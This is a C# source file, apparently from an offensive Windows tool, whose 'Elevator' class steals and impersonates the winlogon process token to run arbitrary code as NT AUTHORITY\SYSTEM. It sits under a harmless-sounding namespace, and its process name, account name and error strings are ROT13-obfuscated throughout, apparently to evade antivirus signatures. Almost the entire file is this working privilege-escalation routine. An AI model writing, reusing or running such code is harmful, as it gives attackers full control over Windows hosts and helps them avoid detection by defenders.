//start
using System.Text;
using System.Linq;
using System;
﻿
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace StuffNeededForWork.Lib
{
    internal class Elevator
    {
        private static bool IsHighIntegrity()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        private static void ImpersonateWinlogon()
        {
            var processes = Process.GetProcessesByName(new string("jvaybtba".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            var handle = processes[0].Handle;

            var success = Interop.OpenProcessToken(handle, 0x0002, out var hProcToken);
            if (!success)
            {
                var errorCode = Marshal.GetLastWin32Error();
                throw new Exception($"OpenProcessToken failed with the following error: {errorCode}");
            }

            var hDupToken = IntPtr.Zero;
            success = Interop.DuplicateToken(hProcToken, 2, ref hDupToken);
            if (!success)
            {
                var errorCode = Marshal.GetLastWin32Error();
                Interop.CloseHandle(hProcToken);
                throw new Exception($"DuplicateToken failed with the following error: {errorCode}");
            }

            success = Interop.ImpersonateLoggedOnUser(hDupToken);
            if (!success)
            {
                var errorCode = Marshal.GetLastWin32Error();
                Interop.CloseHandle(hProcToken);
                Interop.CloseHandle(hDupToken);
                throw new Exception($"ImpersonateLoggedOnUser failed with the following error: {errorCode}");
            }

            Interop.CloseHandle(hProcToken);
            Interop.CloseHandle(hDupToken);

            var name = WindowsIdentity.GetCurrent().Name;

            if (name != new string("AG NHGUBEVGL\\FLFGRZ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()))
                throw new Exception(new string("VzcrefbangrYbttrqBaHfre jbexrq, ohg guernq vf abg ehaavat nf FLFGRZ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
        }

        public static void GetSystem(Action action)
        {
            if (!IsHighIntegrity())
                throw new AccessViolationException(new string("Arrq gb or va na ryringrq pbagrkg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));

            ImpersonateWinlogon();

            try
            {
                action();
            }
            finally
            {
                Interop.RevertToSelf();
            }
        }
    }
}
